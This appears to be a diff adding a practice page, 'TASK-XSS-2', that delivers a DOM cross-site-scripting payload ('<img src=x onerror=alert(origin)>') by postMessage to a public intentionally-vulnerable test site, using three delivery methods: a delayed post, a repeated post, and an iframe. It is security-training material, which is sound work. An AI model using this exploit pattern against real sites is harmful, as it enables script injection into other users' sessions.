@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="">
+  <head>
+    <meta charset="utf-8">
+    <title>TASK-XSS-2</title>
+    <link href="../assets/style.css" rel="stylesheet">
+  </head>
+  <body>
+    <header></header>
+    <main>
+    <div class="group">
+					<button id="a">setTimeout</button>
+					<button id="b">setInterval</button>
+					<button id="c">iframe</button>
+    </div>
+    </main>
+    <footer></footer>
+    <script>
+
+    // init payload
+    const payload = "{\"html\":\"<img src=x onerror=alert(origin)>\"}"
+
+
+					a.addEventListener('click', () => {
+									const target = window.open('https://public-firing-range.appspot.com/dom/toxicdom/postMessage/innerHtml', 'mozillaTab');
+									setTimeout(()=>target.postMessage(payload, '*'),2000);
+					});
+
+					b.addEventListener('click', () => {
+							const target = window.open('https://public-firing-range.appspot.com/dom/toxicdom/postMessage/innerHtml', 'child');
+							let intv = setInterval(() => {
+									if (target.closed) {
+											clearInterval(intv);
+											alert('target cloesd!')
+											return;
+									}
+									target.postMessage(payload, '*');
+							}, 1000);
+					});
+
+					c.addEventListener('click', () => {
+								const ifrm = document.createElement('iframe');
+								ifrm.src= 'https://public-firing-range.appspot.com/dom/toxicdom/postMessage/innerHtml'
+								document.body.append(ifrm);
+								ifrm.style.backgroundColor="#aaa"
+								ifrm.onload = ()=>{
+										ifrm.contentWindow.postMessage(payload, '*');
+								}
+					});
+
+    </script>
+
+  </body>
+</html>
